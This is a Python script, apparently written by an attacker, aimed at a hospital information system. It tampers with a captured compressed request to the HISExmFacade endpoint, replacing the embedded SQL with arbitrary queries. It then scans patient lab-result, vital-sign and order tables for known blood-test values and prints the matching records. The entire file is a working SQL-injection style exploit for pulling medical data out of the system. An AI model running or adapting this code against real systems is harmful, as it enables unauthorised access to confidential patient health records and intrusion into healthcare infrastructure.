from his_client_final import HISClient
import requests
import zlib
import re

class ValueHunter(HISClient):
    def execute_sql(self, sql):
        try:
             # Use EXM payload
            template_path = "HISExmFacade_payload_0.bin"
            with open(template_path, "rb") as f:
                compressed_template = f.read()

            try:
                decompressed = zlib.decompress(compressed_template)
            except:
                decompressed = compressed_template

            original_sql_bytes = b"SELECT * FROM BASCODE WHERE SYSTEMID = 'ORMPRJ' AND SYSCODETYPE = 'OF' AND HISSYSCODE = 'A03772' AND CANCELYN = 'N'"
            
            target_len = len(original_sql_bytes)
            
            if len(sql) > target_len:
                print(f"[-] SQL too long ({len(sql)} > {target_len}).")
                return None
            
            padded_sql = sql.ljust(target_len)
            
            patched_payload = decompressed.replace(original_sql_bytes, padded_sql.encode('utf-8'))
            final_payload = zlib.compress(patched_payload)
            
            response = requests.post(f"{self.base_url}/HISExmFacade", data=final_payload, headers=self.headers)
            
            if response.status_code == 200:
                dec = zlib.decompress(response.content)
                return dec.decode('utf-8', errors='ignore')
            else:
                return None
        except Exception as e:
            print(f"[-] Error: {e}")
            return None

hunter = ValueHunter()

# Values to search
# WBC 7.94, HB 12.2, PLT 313, Glucose 111, Na 135
# Search for the most unique ones first: 7.94, 12.2, 313
targets = ['7.94', '12.2', '313', '111']

# Candidate tables (Broad list)
tables = [
    "OPDUSR.PAT_RESULTD",
    "OPDUSR.EXMREPD",
    "OPDUSR.OPDRXPM",
    "OPDUSR.INABBEDLOG",
    "OPDUSR.INABBED",
    "OPDUSR.VITALSIGNUPLOAD", # Maybe?
    "OPDUSR.VITALSIGN",
    "CPOE.ORDLAB",
    "CPOE.LABSHEET",
    "PCUN.TB_LIS_RESULT",
    "PCUN.TB_RESULT",
    "YAOCLOUD2013.INSPECTION",
    "OPDUSR.LABIHED"
]

print("Scanning tables for known values: 7.94, 12.2, 313...")

for t in tables:
    for val in targets:
        # Search all columns? 
        # Too hard with injection limit.
        # Try generic search if table small? No, table large.
        
        # Try finding columns that might hold it?
        # Or just "SELECT * FROM T WHERE COLUMN_NAME = Val" if we knew the column.
        
        # Let's try searching common value column names
        cols = ['RESULT_VALUE', 'FIELDVALUE', 'LIHERESULT', 'WBC', 'HB', 'PLT', 'GLUCOSE', 'PRD_RESULT_VALUE']
        
        for c in cols:
            sql = f"SELECT * FROM {t} WHERE {c} LIKE '%{val}%' AND ROWNUM<=1"
            # print(f"Checking {t}.{c} for {val}...")
            res = hunter.execute_sql(sql)
            if res and "<NewDataSet>" in res:
                print(f"!!! FOUND MATCH !!! Table: {t}, Col: {c}, Val: {val}")
                print(res[:2000])
                break # Found one match in this table/col, good enough to investigate table

